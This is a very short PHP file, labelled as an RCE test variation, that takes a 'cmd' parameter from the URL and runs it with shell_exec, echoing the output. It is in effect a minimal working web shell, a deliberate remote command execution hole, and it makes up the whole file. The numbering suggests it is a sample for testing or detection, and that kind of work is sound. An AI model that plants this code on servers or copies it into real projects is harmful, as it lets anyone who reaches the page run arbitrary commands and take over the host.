<?php
// RCE test variation #525
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>